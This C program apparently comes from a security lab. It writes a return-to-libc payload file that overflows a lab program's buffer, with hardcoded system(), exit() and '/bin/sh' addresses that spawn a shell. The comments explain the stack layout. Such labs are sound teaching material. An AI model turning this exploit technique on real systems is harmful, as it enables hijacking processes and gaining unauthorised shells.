#include<stdio.h>
#include<string.h>

/*
Program to make our badfile.
First of all i calculated offset address of buf array
by trail and error as size of buffer array is 50 in vul_func
so i started from >50 location in buf array.

Stack Grows from High Address to Low Address
First of all argument of a function get pushed in a function's stack frame
So i kept "bin/sh" at highest location in array

The exit() function address  replaces the return address 
of our system() function so that program gracefully exit() 
and system does not get locked up in infinite loop (HANG)

And lowest location i placed system() address which replaces return address
of vul_func in vul_func.c program 
which therefore calls system() function having "/bin/sh" as argument 
and return address of exit() function

Note->

Here offset Distance is 4 bytes as in 32-bit O.S
EBP(Frame Pointer) , EIP, Return address of 4 bytes
*/


int main(int argc,char **argv)
{
char buf[200];
FILE *badfile;

//Making sure badfile does not have 0's
memset(buf,0xaa,200);

*(long *) &buf[70]=0xbffffe88; //Address of "/bin/sh"
*(long *) &buf[66]=0xb7e52fe0; //Address of exit() function
*(long *) &buf[62]=0xb7e5f460; //Address of system() function

badfile=fopen("./badfile","w");
fwrite(buf,sizeof(buf),1,badfile);
fclose(badfile);
}
